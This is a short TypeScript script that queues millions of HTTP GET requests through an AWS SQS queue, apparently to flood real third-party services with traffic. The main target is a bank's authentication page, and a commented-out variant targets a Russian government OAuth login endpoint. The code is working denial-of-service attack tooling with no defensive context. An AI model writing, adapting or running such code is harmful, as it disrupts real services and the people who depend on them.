import AWS from 'aws-sdk';
import pMap from 'p-map';
import {times} from 'lodash';

const sqs = new AWS.SQS({region: 'us-east-1'});

const payloads: any[] = [];

for (let i = 0; i < 5000; i++) {
  // payloads.push({
  //   url: `https://passport.info.gov.ru/oauth2/authorize?client_id=nsud-pmd&nonce=${Math.random()}&redirect_uri=https%3A%2F%2Fnsud.info.gov.ru%2Fpmd%2Fusers%2Fauth%2Fopenid_connect%2Fcallback&response_type=code&scope=openid%20email%20profile%20groups%20permissions%20fullname%20phone&state=${Math.random()}`,
  //   method: 'GET',
  // });
  payloads.push({
    url: `https://my.crb-dnr.ru/rich/auth`,
    method: 'GET',
  });
}

(async () => {
  await pMap(
    times(10000),
    async () => {
      await sqs
        .sendMessage({
          QueueUrl: 'https://sqs.us-east-1.amazonaws.com/494014222317/requests',
          MessageBody: JSON.stringify(payloads),
        })
        .promise();
    },
    {concurrency: 100, stopOnError: false}
  );

  process.exit(0);
})();
